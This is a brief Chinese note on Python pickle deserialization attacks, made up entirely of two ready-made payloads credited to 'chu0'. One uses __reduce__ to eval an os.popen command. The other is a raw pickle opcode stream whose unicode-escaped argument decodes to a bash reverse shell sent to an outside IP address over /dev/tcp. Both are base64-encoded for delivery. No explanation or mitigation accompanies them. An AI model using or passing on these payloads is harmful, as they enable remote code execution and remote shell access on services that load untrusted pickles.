# pickle反序列化

chu0的两个payload

```python
import pickle
import base64
 
class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').popen('ls').read()",))
    
a = A()
a = pickle.dumps(a)
print(base64.b64encode(a))
```

```python
import base64
payload=b'''(S'key1'\nS'val1'\ndS'vul'\n(cos\nsystem\nV\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0037\u002e\u0031\u0032\u0031\u002e\u0031\u0032\u0033\u002e\u0039\u0036\u002f\u0032\u0035\u0030\u0020\u0030\u003e\u0026\u0031\u0022\nos.'''
print(base64.b64encode(payload))
```

